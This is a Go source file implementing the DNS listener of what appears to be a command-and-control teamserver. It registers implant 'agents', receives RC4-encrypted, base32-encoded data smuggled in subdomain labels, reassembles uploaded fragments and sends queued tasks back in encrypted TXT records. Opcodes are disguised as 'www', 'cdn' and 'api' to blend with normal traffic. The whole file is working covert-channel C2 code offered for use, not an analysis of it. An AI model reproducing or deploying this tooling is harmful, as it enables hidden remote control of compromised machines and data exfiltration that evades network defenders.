package main

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
	"crypto/rc4"

	"github.com/miekg/dns"
)

func rc4Crypt(data []byte, keyHex string) []byte {
	if len(data) == 0 {
		return data
	}
	keyBytes, err := hex.DecodeString(keyHex)
	if err != nil || len(keyBytes) != 16 {
		return data
	}
	cipher, err := rc4.NewCipher(keyBytes)
	if err != nil {
		return data
	}
	result := make([]byte, len(data))
	cipher.XORKeyStream(result, data)
	return result
}

type dnsFragBuf struct {
	total       uint32
	buf         []byte
	filled      uint32
	highWater   uint32
	expectedOff uint32
	lastUpdate  time.Time
	seenOffsets map[uint32]bool
}

type dnsDownBuf struct {
	total      uint32
	off        uint32
	buf        []byte
	taskNonce  uint32
	lastUpdate time.Time
}

type dnsUpDone struct {
	total  uint32
	doneAt time.Time
}

const metaV1Size = 8

type metaV1 struct {
	Version       byte
	MetaFlags     byte
	Reserved      uint16
	DownAckOffset uint32
}

func parseMetaV1(data []byte) (metaV1, []byte, bool) {
	var m metaV1
	if len(data) < metaV1Size {
		return m, data, false
	}
	m.Version = data[0]
	m.MetaFlags = data[1]
	m.Reserved = binary.LittleEndian.Uint16(data[2:4])
	m.DownAckOffset = binary.LittleEndian.Uint32(data[4:8])
	return m, data[metaV1Size:], true
}

// decompressUpstream handles upstream data with optional compression
// Format: [flags:1][origLen:4][payload] where flags&0x1 indicates zlib compression
func decompressUpstream(data []byte) []byte {
	if len(data) <= 5 {
		return data
	}
	flags := data[0]
	origLen := uint32(data[1]) | uint32(data[2])<<8 | uint32(data[3])<<16 | uint32(data[4])<<24
	payload := data[5:]
	
	if (flags & 0x1) != 0 {
		// Compressed - decompress with zlib
		if origLen > 0 && origLen <= 4<<20 {
			zr, err := zlib.NewReader(bytes.NewReader(payload))
			if err == nil {
				decompressed := make([]byte, origLen)
				n, errRead := zr.Read(decompressed)
				zr.Close()
				if errRead == nil || (n > 0 && n == int(origLen)) {
					return decompressed[:n]
				}
			}
		}
	} else if origLen > 0 && origLen <= uint32(len(payload)) {
		// Not compressed, but has header - extract payload
		return payload[:origLen]
	}
	return data
}

type DNSListener struct {
	Config DNSConfig
	Name   string
	Active bool

	udpServer *dns.Server
	tcpServer *dns.Server
	ts        Teamserver

	mu          sync.Mutex
	upFrags     map[string]*dnsFragBuf
	downFrags   map[string]*dnsDownBuf
	upDoneCache map[string]*dnsUpDone
	rng         *rand.Rand
}

func (d *DNSListener) Start(ts Teamserver) error {
	if d.Config.TTL <= 0 {
		d.Config.TTL = 10
	}
	if d.Config.PktSize <= 0 || d.Config.PktSize > 64000 {
		d.Config.PktSize = 4096
	}
	d.rng = rand.New(rand.NewSource(time.Now().UnixNano()))
	d.upFrags = make(map[string]*dnsFragBuf)
	d.downFrags = make(map[string]*dnsDownBuf)
	d.upDoneCache = make(map[string]*dnsUpDone)

	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))

	mux := dns.NewServeMux()
	mux.HandleFunc(".", d.handleDNS)

	d.udpServer = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	d.tcpServer = &dns.Server{Addr: addr, Net: "tcp", Handler: mux}
	d.ts = ts

	go func() {
		if err := d.udpServer.ListenAndServe(); err != nil {
			fmt.Printf("[BeaconDNS] UDP listener error: %v\n", err)
		}
	}()

	go func() {
		if err := d.tcpServer.ListenAndServe(); err != nil {
			fmt.Printf("[BeaconDNS] TCP listener error: %v\n", err)
		}
	}()

	go d.cleanupStaleFragments()

	time.Sleep(200 * time.Millisecond)
	d.Active = true
	return nil
}

func (d *DNSListener) cleanupStaleFragments() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if !d.Active {
			return
		}

		now := time.Now()
		staleTimeout := 5 * time.Minute
		dedupTimeout := 5 * time.Minute
		downTimeout := 10 * time.Minute

		d.mu.Lock()
		for sid, fb := range d.upFrags {
			if now.Sub(fb.lastUpdate) > staleTimeout {
				delete(d.upFrags, sid)
			}
		}
		for sid, done := range d.upDoneCache {
			if now.Sub(done.doneAt) > dedupTimeout {
				delete(d.upDoneCache, sid)
			}
		}
		for sid, db := range d.downFrags {
			if db == nil {
				delete(d.downFrags, sid)
				continue
			}
			if !db.lastUpdate.IsZero() && now.Sub(db.lastUpdate) > downTimeout {
				delete(d.downFrags, sid)
			}
		}
		d.mu.Unlock()
	}
}

func (d *DNSListener) Stop() error {
	d.Active = false
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	var err error
	if d.udpServer != nil {
		if e := d.udpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	if d.tcpServer != nil {
		if e := d.tcpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	return err
}

func (d *DNSListener) handlePutFragment(sid string, seq int, data []byte) {
	if sid == "" {
		return
	}
	if len(data) == 0 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}
	if len(data) <= 8 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	var total uint32
	var offset uint32
	var chunk []byte

	meta, rest, hasMeta := parseMetaV1(data)
	if hasMeta {
		if (meta.MetaFlags & 0x1) != 0 {
			var ackTaskNonce uint32 = 0
			var shouldAck bool = false

			d.mu.Lock()
			df, hasDf := d.downFrags[sid]
			if hasDf && df != nil {
				ackTaskNonce = df.taskNonce
				if df.total > 0 && meta.DownAckOffset == df.total {
					shouldAck = true
				}
			}
			d.mu.Unlock()

			if shouldAck {
				_ = d.ts.TsAgentAckDelivery(sid, ackTaskNonce)
				d.mu.Lock()
				if cur, ok := d.downFrags[sid]; ok && cur != nil && cur.taskNonce == ackTaskNonce {
					delete(d.downFrags, sid)
				}
				d.mu.Unlock()
			}
		}

		if len(rest) <= 8 {
			_ = d.ts.TsAgentProcessData(sid, rest)
			return
		}
		total = binary.BigEndian.Uint32(rest[0:4])
		offset = binary.BigEndian.Uint32(rest[4:8])
		chunk = rest[8:]
	} else {
		total = binary.BigEndian.Uint32(data[0:4])
		offset = binary.BigEndian.Uint32(data[4:8])
		chunk = data[8:]
	}

	const maxUploadSize = 4 << 20
	if total == 0 || total > maxUploadSize {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	if offset == 0 && total <= uint32(len(chunk)) {
		_ = d.ts.TsAgentProcessData(sid, decompressUpstream(chunk))
		return
	}

	key := sid

	d.mu.Lock()
	defer d.mu.Unlock()

	if done, exists := d.upDoneCache[key]; exists && done.total == total {
		return
	}

	fb, ok := d.upFrags[key]
	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
		buf := make([]byte, total)
		fb = &dnsFragBuf{
			total:       total,
			buf:         buf,
			filled:      0,
			highWater:   0,
			expectedOff: 0,
			lastUpdate:  time.Now(),
			seenOffsets: make(map[uint32]bool),
		}
		d.upFrags[key] = fb
	}

	if offset >= fb.total {
		return
	}

	if fb.seenOffsets[offset] {
		return
	}

	end := offset + uint32(len(chunk))
	if end > fb.total {
		end = fb.total
	}
	n := end - offset
	copy(fb.buf[offset:end], chunk[:n])

	fb.seenOffsets[offset] = true
	fb.filled += n
	fb.expectedOff = end
	fb.lastUpdate = time.Now()

	if end > fb.highWater {
		fb.highWater = end
	}

	if fb.filled >= fb.total {
		_ = d.ts.TsAgentProcessData(sid, decompressUpstream(fb.buf))
		d.upDoneCache[key] = &dnsUpDone{total: fb.total, doneAt: time.Now()}
		delete(d.upFrags, key)
	}
}

func (d *DNSListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	baseTTL := uint32(d.Config.TTL)
	if baseTTL == 0 {
		baseTTL = 10
	}
	ttl := baseTTL + uint32(d.rng.Intn(60))

	reqQType := dns.TypeTXT
	if len(r.Question) > 0 {
		reqQType = r.Question[0].Qtype
	}

	for _, q := range r.Question {
		labels := dns.SplitDomainName(q.Name)
		base := labels

		if len(d.Config.Domains) > 0 {
			for i := range labels {
				tail := strings.ToLower(strings.Join(labels[i:], "."))
				for _, dom := range d.Config.Domains {
					if tail == dom {
						base = labels[:i]
						break
					}
				}
				if len(base) < len(labels) {
					break
				}
			}
		}

		var sid, op string
		var seq int
		var dataB []byte

		if len(base) >= 5 {
			sid = strings.ToLower(base[0])
			rawOp := strings.ToLower(base[1])
			switch rawOp {
			case "www", "hi":
				op = "HI"
			case "cdn", "put":
				op = "PUT"
			case "api", "get":
				op = "GET"
			case "hb":
				op = "HB"
			default:
				op = ""
			}

			if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
				seq = int(v ^ 0x39913991)
			}

			dataLabel := strings.Join(base[4:], "")
			enc := base32.StdEncoding.WithPadding(base32.NoPadding)
			dataLabel = strings.ToUpper(dataLabel)
			if db, err := enc.DecodeString(dataLabel); err == nil {
				dataB = db
			}
		}

		if sid != "" {
			validSid := len(sid) == 8
			if validSid {
				for i := 0; i < 8; i++ {
					c := sid[i]
					if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
						validSid = false
						break
					}
				}
			}
			if !validSid {
				op = ""
			}
		}

		maxPayload := d.Config.PktSize * 4
		if maxPayload <= 0 {
			maxPayload = 4096
		}
		if len(dataB) > maxPayload {
			dataB = nil
		}

		switch op {
		case "HI", "PUT":
			if len(dataB) > 0 {
				if op == "HI" {
					keyBytes, _ := hex.DecodeString(d.Config.EncryptKey)
					if len(keyBytes) == 16 && len(dataB) >= 8 {
						if c, e := rc4.NewCipher(keyBytes); e == nil {
							fullBeat := make([]byte, len(dataB))
							c.XORKeyStream(fullBeat, dataB)
							if len(fullBeat) >= 8 {
								agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[:4]))
								agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[4:8]))
								beat := fullBeat[8:]
								if !d.ts.TsAgentIsExists(agentId) {
									externalIP := ""
									if host, _, err := net.SplitHostPort(w.RemoteAddr().String()); err == nil {
										if ip := net.ParseIP(host); ip != nil {
											if v4 := ip.To4(); v4 != nil {
												externalIP = v4.String()
											} else {
												externalIP = ip.String()
											}
										} else {
											externalIP = host
										}
									}
									_, _ = d.ts.TsAgentCreate(agentType, agentId, beat, d.Name, externalIP, true)
								}
								_ = d.ts.TsAgentSetTick(agentId)
							}
						}
					}
				}
				if op == "PUT" {
					decrypted := rc4Crypt(dataB, d.Config.EncryptKey)
					d.handlePutFragment(sid, seq, decrypted)
					if sid != "" {
						_ = d.ts.TsAgentSetTick(sid)
					}
				}
			}

			if reqQType == dns.TypeA {
				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("127.0.0.1").To4()}
				m.Answer = append(m.Answer, rr)
			} else if reqQType == dns.TypeAAAA {
				rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::1").To16()}
				m.Answer = append(m.Answer, rr)
			} else {
				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
				m.Answer = append(m.Answer, rr)
			}

		case "GET":
			if sid != "" {
				_ = d.ts.TsAgentSetTick(sid)
			}

			decryptedGet := rc4Crypt(dataB, d.Config.EncryptKey)

			var reqOffset uint32 = 0
			var reqNonce uint32 = 0
			if len(decryptedGet) >= 4 {
				reqOffset = binary.BigEndian.Uint32(decryptedGet[0:4])
			}
			if len(decryptedGet) >= 8 {
				reqNonce = binary.BigEndian.Uint32(decryptedGet[4:8])
			}

			var df *dnsDownBuf
			if sid != "" {
				d.mu.Lock()
				if buf, ok := d.downFrags[sid]; ok {
					df = buf
					if df != nil {
						df.lastUpdate = time.Now()
						if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
							df.off = reqOffset
						}
					}
				}
				d.mu.Unlock()
			}

			if df == nil || df.off >= df.total {
				if df != nil && df.off >= df.total {
					d.mu.Lock()
					delete(d.downFrags, sid)
					d.mu.Unlock()
					df = nil
				}

				maxDataSize := d.Config.PktSize * 256
				if maxDataSize <= 0 || maxDataSize > (4<<20) {
					maxDataSize = 4 << 20
				}
				if p, taskNonce, err := d.ts.TsAgentGetHostedAllDelivery(sid, maxDataSize); err == nil && len(p) > 0 {
					origLen := len(p)
					flags := byte(0)
					payload := p

					const minCompressSize = 2048
					if origLen > minCompressSize {
						var zbuf bytes.Buffer
						wz, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
						if errW == nil {
							if _, errC := wz.Write(p); errC == nil && wz.Close() == nil {
								comp := zbuf.Bytes()
								if len(comp) > 0 && len(comp) < origLen {
									payload = comp
									flags = 1
								}
							} else {
								_ = wz.Close()
							}
						}
					}

					totalLen := 1 + 4 + 4 + len(payload)
					buf := make([]byte, totalLen)
					buf[0] = flags
					buf[1] = byte(taskNonce & 0xFF)
					buf[2] = byte((taskNonce >> 8) & 0xFF)
					buf[3] = byte((taskNonce >> 16) & 0xFF)
					buf[4] = byte((taskNonce >> 24) & 0xFF)
					buf[5] = byte(origLen & 0xFF)
					buf[6] = byte((origLen >> 8) & 0xFF)
					buf[7] = byte((origLen >> 16) & 0xFF)
					buf[8] = byte((origLen >> 24) & 0xFF)
					copy(buf[9:], payload)
					df = &dnsDownBuf{total: uint32(len(buf)), off: 0, buf: buf, taskNonce: taskNonce, lastUpdate: time.Now()}

					d.mu.Lock()
					d.downFrags[sid] = df
					d.mu.Unlock()
				}
			}

			var frame []byte
			if df != nil {
				requestedOffset := reqOffset
				if requestedOffset >= df.total {
					requestedOffset = 0
				}
				_ = reqNonce

				if df.total > 0 {
					maxChunk := d.Config.PktSize
					isTCP := w.RemoteAddr().Network() == "tcp"

					if !isTCP {
						const dnsSafeChunk = 280
						if maxChunk <= 0 || maxChunk > dnsSafeChunk {
							maxChunk = dnsSafeChunk
						}
					} else {
						if maxChunk <= 0 {
							maxChunk = 4096
						}
					}

					remaining := df.total - requestedOffset
					chunkLen := remaining
					if chunkLen > uint32(maxChunk) {
						chunkLen = uint32(maxChunk)
					}

					frame = make([]byte, 8+chunkLen)
					binary.BigEndian.PutUint32(frame[0:4], df.total)
					binary.BigEndian.PutUint32(frame[4:8], requestedOffset)
					copy(frame[8:], df.buf[requestedOffset:requestedOffset+chunkLen])
				}
			}

			if len(frame) == 0 {
				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
				m.Answer = append(m.Answer, rr)
			} else {
				encryptedFrame := rc4Crypt(frame, d.Config.EncryptKey)
				b64Str := base64.StdEncoding.EncodeToString(encryptedFrame)
				var chunks []string
				for len(b64Str) > 255 {
					chunks = append(chunks, b64Str[:255])
					b64Str = b64Str[255:]
				}
				chunks = append(chunks, b64Str)

				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: chunks}
				m.Answer = append(m.Answer, rr)
			}

		case "HB":
			if sid != "" {
				_ = d.ts.TsAgentSetTick(sid)
			}

			decryptedHB := rc4Crypt(dataB, d.Config.EncryptKey)

			var ackOffset uint32 = 0
			var ackTaskNonce uint32 = 0
			if len(decryptedHB) >= 4 {
				ackOffset = binary.BigEndian.Uint32(decryptedHB[0:4])
			}
			// Skip bytes 4-8 (hbNonce - reserved for future use)
			if len(decryptedHB) >= 12 {
				ackTaskNonce = binary.BigEndian.Uint32(decryptedHB[8:12])
			}

			d.mu.Lock()
			df, hasDf := d.downFrags[sid]
			if hasDf && df != nil {
				df.lastUpdate = time.Now()
			}
			if hasDf && df != nil && df.total > 0 && ackOffset >= df.total {
				if ackTaskNonce == df.taskNonce {
					_ = d.ts.TsAgentAckDelivery(sid, df.taskNonce)
					delete(d.downFrags, sid)
					df = nil
					hasDf = false
				}
			}
			d.mu.Unlock()

			if !hasDf || df == nil {
				maxDataSize := d.Config.PktSize * 256
				if maxDataSize <= 0 || maxDataSize > (4<<20) {
					maxDataSize = 4 << 20
				}
				if p, taskNonce, err := d.ts.TsAgentGetHostedAllDelivery(sid, maxDataSize); err == nil && len(p) > 0 {
					origLen := len(p)
					flags := byte(0)
					payload := p

					const minCompressSize = 2048
					if origLen > minCompressSize {
						var zbuf bytes.Buffer
						wz, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
						if errW == nil {
							if _, errC := wz.Write(p); errC == nil && wz.Close() == nil {
								comp := zbuf.Bytes()
								if len(comp) > 0 && len(comp) < origLen {
									payload = comp
									flags = 1
								}
							} else {
								_ = wz.Close()
							}
						}
					}

					totalLen := 1 + 4 + 4 + len(payload)
					buf := make([]byte, totalLen)
					buf[0] = flags
					buf[1] = byte(taskNonce & 0xFF)
					buf[2] = byte((taskNonce >> 8) & 0xFF)
					buf[3] = byte((taskNonce >> 16) & 0xFF)
					buf[4] = byte((taskNonce >> 24) & 0xFF)
					buf[5] = byte(origLen & 0xFF)
					buf[6] = byte((origLen >> 8) & 0xFF)
					buf[7] = byte((origLen >> 16) & 0xFF)
					buf[8] = byte((origLen >> 24) & 0xFF)
					copy(buf[9:], payload)
					df = &dnsDownBuf{total: uint32(len(buf)), off: 0, buf: buf, taskNonce: taskNonce, lastUpdate: time.Now()}

					d.mu.Lock()
					d.downFrags[sid] = df
					d.mu.Unlock()
				}
			}

			rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
			m.Answer = append(m.Answer, rr)

		default:
			rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
			m.Answer = append(m.Answer, rr)
		}
	}

	_ = w.WriteMsg(m)
}
